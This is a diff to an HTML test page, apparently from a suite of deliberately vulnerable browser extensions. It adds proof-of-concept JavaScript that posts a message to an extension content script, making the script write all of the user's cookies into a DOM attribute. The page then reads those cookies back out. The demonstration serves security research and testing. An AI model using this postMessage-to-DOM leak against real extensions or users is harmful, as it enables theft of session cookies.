@@ -43,5 +43,34 @@
 			});
 		</script>
 
+		<br/>
+		<br/>
+		<br/>
+
+		<!-- (c) /vuln01_weak_mv3_postMessage_and_dom -->
+		<!--
+		The content script of this extension leaks sensitive data that it received from the service worker (namely all of the user's cookies)
+		into the DOM of a (potentially malicious) website (namely into an attribute called "cookies" of an element with id "some-id2"),
+		after this website sent a postMessage to the content script.
+		-->
+		<span id="some-id2" data-some-attr="foo">This is yet another totally benign piece of text.</span><br/>
+		<span id="cookies2"></span>
+		<script>
+			// Send a postMessage to the content script, triggering it to leak sensitve data into the DOM:
+			setTimeout(function() {
+				window.postMessage({ type: 'FROM_PAGE', payload: "A message from (malicious) page to (vulnerable) content script" }, '*');
+			}, 150);
+
+			// (c) /vuln01_weak_mv3_postMessage_and_dom:
+			setTimeout(function() {
+				// Access the leaked sensitive data:
+				if (document.getElementById('some-id2').hasAttribute("cookies")) {
+					let leaked_cookie_data = document.getElementById('some-id2').getAttribute("cookies");
+					document.getElementById('cookies2').innerText = "Leaked cookie data (received via DOM): "
+						+ leaked_cookie_data.substring(0, 1000) + " ... " + leaked_cookie_data.substring(leaked_cookie_data.length-1000);
+				}
+			}, 350);
+		</script>
+
 	</body>
 </html>
